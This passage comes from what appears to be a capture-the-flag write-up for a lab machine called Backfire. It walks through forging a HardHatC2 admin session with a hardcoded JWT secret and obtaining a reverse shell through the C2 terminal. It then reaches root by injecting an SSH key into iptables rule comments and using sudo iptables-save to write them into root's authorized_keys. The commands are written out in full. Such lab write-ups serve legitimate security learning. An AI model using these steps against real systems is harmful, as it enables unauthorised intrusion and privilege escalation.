The JWT secret is hardcoded. If it wasn’t modified, I can forge an account.

I’ll clone the repo and run `docker compose up` to get a local copy running. It tells me the servers are running on 5000 and 7096, and then gives the login information for this instance:

```

hardhat_server  |     Username: HardHat_Admin
hardhat_server  |     Password: p3svHI=s-R@*7DfRr*u5

```

I’ll open `https://localhost:7096` and log in with those creds.

There’s not a ton going on here, but the “Admin Dashboard” does allow me to create a new user:

![image-20250124162105885](/img/image-20250124162105885.png)

Logging in as this user, there’s a ton more functionality, including a terminal:

![image-20250124162317629](/img/image-20250124162317629.png)

I can list the local Docker hostname and user.

#### Token

Before shutting down my Docker container, I’ll look at how the tokens are stored. There’s no cookies for the site, but there are values in Local Storage:

![image-20250124162430127](/img/image-20250124162430127.png)

I’ll log out as 0xdf and back in as HardHat\_Admin. This user should exist on Backfire as well, and if the JWT secrets are the same, then the token generated here will work there as well:

![image-20250124162551833](/img/image-20250124162551833.png)

#### Remote

I’ll kill the Docker and add SSH tunnels to access ports 5000 and 7096:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen ilya@10.10.11.49 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
...[snip]...
ilya@backfire:~$ 

```

Now when I open `https://127.0.0.1:7096/Settings`, it loads! I didn’t even have to change the cookies since both sites were accessed at the same place. Because the same shared secret is in use, the token just works.

![image-20250124162826075](/img/image-20250124162826075.png)

I’ll create a user with Team Lead role and log in. At the terminal, I’ll see the hostname:

![image-20250124163007485](/img/image-20250124163007485.png)

I’ll issue a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20250124163052440](/img/image-20250124163052440.png)

It connects to my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.49 58572
bash: cannot set terminal process group (8128): Inappropriate ioctl for device
bash: no job control in this shell
sergej@backfire:~/HardHatC2/HardHatC2Client$

```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

sergej@backfire:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
sergej@backfire:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
sergej@backfire:~$

```

## Shell as root

### Enumeration

sergej has `sudo` permissions to run `iptables` and `iptables-save` as root on Backfire:

```

sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save

```

### File Write

#### Strategy

`man iptables-save` shows there’s a `-f` option:

```

sergej@backfire:~$ man iptables-save
...[snip]...
       -f, --file filename
              Specify a filename to log the output to. If not specified, ipta‐
              bles-save will log to STDOUT.
...[snip]...

```

This means I can write as root if I can get what I want to write into an iptables rule.

#### Write Comment

[This article](https://www.cyberciti.biz/faq/how-to-add-comments-to-iptables-rules-on-linux/) shows how to put a comment into an iptables rule. I’ll test it:

```

sergej@backfire:/$ sudo iptables -A INPUT -i lo -m comment --comment "test"
sergej@backfire:/$ sudo iptables-save 
# Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:41:42 2025
*filter
:INPUT ACCEPT [5331:11868675]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [6968:23797449]
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment test
COMMIT
# Completed on Fri Jan 24 16:41:42 2025

```

I would like the comment to start on a new line. I’ll add a new line:

```

sergej@backfire:/$ sudo iptables -A INPUT -i lo -m comment --comment $'\ntest\n'
sergej@backfire:/$ sudo iptables-save                                           
# Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:42:32 2025
*filter
:INPUT ACCEPT [130:28055]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [174:35449]
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "test"
-A INPUT -i lo -m comment --comment "
test
"
COMMIT
# Completed on Fri Jan 24 16:42:32 2025

```

That works!

#### Write SSH Key

I’ll write my public SSH key into a comment:

```

sergej@backfire:/$ sudo iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\n'

```

`authorized_keys` files ignore lines that don’t match the required format, so as long as I get my key onto its own line, it should work:

```

@backfire:/$ sudo iptables-save                
# Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:43:48 2025
*filter
:INPUT ACCEPT [227:81030]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [436:104924]
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "\\ntest\\n"
-A INPUT -i lo -m comment --comment "
test
"
-A INPUT -i lo -m comment --comment "
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
"
COMMIT
# Completed on Fri Jan 24 16:43:48 2025

```

I’ll save that to root’s `authorized_keys` file:

```

sergej@backfire:/$ sudo iptables-save -f /root/.ssh/authorized_keys

```

And connect with SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.49
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
root@backfire:~# 

```